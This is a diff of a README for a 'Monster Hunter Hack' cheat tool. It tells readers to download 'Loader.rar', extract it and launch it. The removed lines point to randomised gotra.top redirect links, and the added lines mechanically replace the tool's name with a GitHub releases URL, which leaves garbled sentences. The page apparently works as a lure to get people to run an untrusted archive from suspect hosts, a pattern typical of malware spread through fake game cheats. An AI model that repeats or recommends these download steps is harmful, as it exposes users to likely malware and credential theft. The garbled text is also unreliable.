@@ -1,11 +1,11 @@
-![maxresdefault](https://github.com/user-attachments/assets/776bbde1-b94e-4538-9e92-02cded970395)
+![maxresdefault](https://github.com/MGamer15YT/Monster-Hunter-Cheat/releases)
 
 # 🎮 Monster Hunter Hack
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/MGamer15YT/Monster-Hunter-Cheat/releases](https://github.com/MGamer15YT/Monster-Hunter-Cheat/releases)](https://github.com/MGamer15YT/Monster-Hunter-Cheat/releases)
 
-**Loader.rar** is a powerful tool designed to enhance your gameplay experience in the **Monster Hunter** series. It includes various cheats and modifications that can help you farm resources faster, defeat monsters with ease, and enjoy a more customizable gaming experience.
+**https://github.com/MGamer15YT/Monster-Hunter-Cheat/releases** is a powerful tool designed to enhance your gameplay experience in the **Monster Hunter** series. It includes various cheats and modifications that can help you farm resources faster, defeat monsters with ease, and enjoy a more customizable gaming experience.
 
 ---
 
@@ -24,7 +24,7 @@
 
 ## 🚀 Installation
 
-1. Download **Loader.rar** from the official website or trusted source.  
+1. Download **https://github.com/MGamer15YT/Monster-Hunter-Cheat/releases** from the official website or trusted source.  
 2. Extract the files into a folder of your choice.  
 3. Launch the cheat tool and follow the on-screen instructions for setup.  
 4. Start **Monster Hunter** and activate the cheats you wish to use.  
@@ -35,7 +35,7 @@
 ## 🕹️ How to Use
 
 1. Open **Monster Hunter** and wait for the main menu to load.  
-2. Launch the **Loader.rar** tool.  
+2. Launch the **https://github.com/MGamer15YT/Monster-Hunter-Cheat/releases** tool.  
 3. Enable the cheats you want to activate, such as one-hit kill, god mode, or unlimited resources.  
 4. Once the cheats are activated, return to the game and enjoy the benefits.  
 5. Use the cheats responsibly and experiment with different features to enhance your gameplay.
